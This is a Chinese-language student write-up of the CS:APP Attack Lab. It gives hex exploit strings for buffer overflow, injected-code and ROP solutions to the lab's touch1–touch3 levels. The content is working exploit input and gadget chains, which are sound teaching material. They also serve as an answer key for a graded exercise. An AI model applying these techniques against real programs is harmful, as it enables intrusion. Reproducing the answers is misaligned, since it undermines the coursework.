# Attack Lab

任务总评：虽然我是pwn弟弟，但题目难度真是easy pwn（注意是x64下的pwn）。

解析机器码的几种方式（pwntools、x64dbg、在线）。

## 1.栈溢出

### touch1

基本栈溢出，缓冲区长度是40

```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
c0 17 40 00 00 00 00 00
```

### touch2

第二题难度也不大，需要在到达touch2之前，把cookie变成参数val的值，需要在栈中注入代码，然后缓冲区溢出修改返回的地址值位栈中注入代码的位置，然后执行完后，把栈顶改为touch2的地址即可。

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
51 51 51
51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
78 dc 61 55 00 00 00 00
```

### touch3

第三题也是注入代码，将 `cookie` 的字符串的地址传入函数，注入代码和第二题类似，但是注意因为第三题中，后续操作会将 buf 栈中的 40 个字节覆盖了，所以不能将字符串存储中这里，改为存储在调用函数前的栈中，通过打断点得到其栈顶地址是 `0x5561dca0` 。所以应该把字符串存入的地址设为 `0x5561dca8` ，这个地址在输入的 16 进制中就紧跟着跳转的地址。   
注入的代码（已经反编译了）：

```
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

再和上题类似填充至 40 字节，附上跳转地址。再将 `cookie` 转化为 16 进制的字符串附到跳转地址后面，根据 `ASCII` 码，这里的 `cookie` 值 `0x59b997fa` 就是 `35 39 62 39 39 37 66 61 00` 这里末尾加 `00` ，我不知道是什么意思，不过看很多人都加了，我也跟风。。经验证，加不加对结果无影响。因而最终答案是：

```
48 c7 c7 a8 dc 61 55 
68 fa 18 40 00 
c3 
30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

## 2.ROP

### touch2

```
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
ab 19 40 00 00 00 00 00  /* jump to 4019ab popq %rax */
fa 97 b9 59 00 00 00 00  /* cookie  */
a2 19 40 00 00 00 00 00  /* jump to 4019a2  movq %rax, %rdi  */
ec 17 40 00 00 00 00 00 00 /* touch2 */
```

### touch3

```
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
06 1a 40 00 00 00 00 00  /* jump to 401a0b movq %rsp, %rax */
d8 19 40 00 00 00 00 00  /* jump to 4019d8 add $0x37, %al */
a2 19 40 00 00 00 00 00  /* jump to 4019a2  movq %rax, %rdi  */
fa 18 40 00 00 00 00 00  /* jump to 4018fa touch3 */
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 35
39 62 39 39 37 66 61 00 /* cookie */
```

多了canary，，不过还是挺简单